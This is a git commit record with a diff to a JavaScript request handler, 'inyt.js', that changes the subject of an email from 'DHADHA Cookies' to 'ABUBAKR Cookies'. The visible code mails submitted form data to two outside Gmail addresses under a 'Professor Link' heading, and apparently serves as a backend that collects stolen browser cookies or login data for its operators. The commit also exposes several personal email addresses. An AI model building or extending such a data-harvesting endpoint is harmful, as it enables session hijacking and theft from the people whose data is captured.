634faf45187d4645f356dd5caf4085910b4b08d7
nxnxcmmc-sys <nxnxcmmc@gmail.com>
2026-04-23 11:24:02 +0500

    Update inyt.js

--- inyt.js
+++ inyt.js
@@ -42,7 +42,7 @@ export default async function handler(req, res) {
     await transporter.sendMail({
       from: `"PROFESSOR" <bowlapple53@gmail.com>`,
       to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com",
-      subject: "DHADHA Cookies",
+      subject: "ABUBAKR Cookies",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Link</h3><pre>${JSON.stringify(
         formData,
